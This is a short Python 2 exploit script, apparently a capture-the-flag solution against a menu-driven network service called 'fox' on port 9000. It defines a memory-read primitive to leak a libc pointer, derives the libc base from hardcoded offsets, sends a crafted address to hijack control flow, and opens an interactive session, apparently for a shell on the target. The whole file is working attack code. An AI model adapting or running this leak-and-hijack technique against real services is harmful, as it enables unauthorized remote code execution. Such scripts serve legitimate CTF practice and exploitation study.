import socket
import sys
import os
import struct
import telnetlib

def readuntil(so,n):
    d = ''
    while not n in d:
        c = so.recv(1)
        if c == '': raise Exception("Disconnected: "+repr(d))
        d+=c
    return d

def readmem(addr,nb):
    fd = ''
    while len(fd)<nb:
        readuntil(so,'name:')
        so.send("a\n")
        readuntil(so,'for:')
        so.send("a\n")
        readuntil(so,'? ')
        so.send(str(addr+len(fd))+"\n")
        d = readuntil(so,'\n[Press')[:-7]
        print repr(d)
        readuntil(so,']\n')
        so.send("\n")
        fd += d+'\x00'
    fd = fd[:nb]
    return fd

    

so = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
if len(sys.argv)==1:
    so.connect(('',9000))
    os.system('ps aux | grep fox')
    raw_input()
else:
    so.connect(('fox.pwn.republican',9000))
    raw_input()


fg = readmem(0x602040,8)
fg = struct.unpack('<Q',fg)[0]
print hex(fg)

#lbc = fg - 0x6E220
lbc = fg - 0x6dad0



print readuntil(so,'name:')
so.send("a\n")
print readuntil(so,'for:')
so.send("a\n")
print readuntil(so,'?')
so.send("1\n")
print readuntil(so,']\n')
so.send("\n")

print readuntil(so,'name:')
so.send("b\n")
print readuntil(so,'for:')
so.send("a\n")
print readuntil(so,'?')
so.send("1\n")
print readuntil(so,']\n')
so.send("\n")

print readuntil(so,'name:')
so.send("123\n")
print readuntil(so,'for:')
so.send("a\n")
print readuntil(so,'?')

addr = lbc + 0xE4AC8 - 0x4009e0 +1 
addr = lbc + 0xF5B10 - 0x4009e0 +1 

so.send(str(addr)+"\n")
print readuntil(so,']\n')
so.send("\n")

print readuntil(so,'name:')
so.send("a\n")
print readuntil(so,'for:')
so.send("b\n")
print readuntil(so,'?')
so.send("1\n")

t = telnetlib.Telnet()
t.sock = so
t.interact()

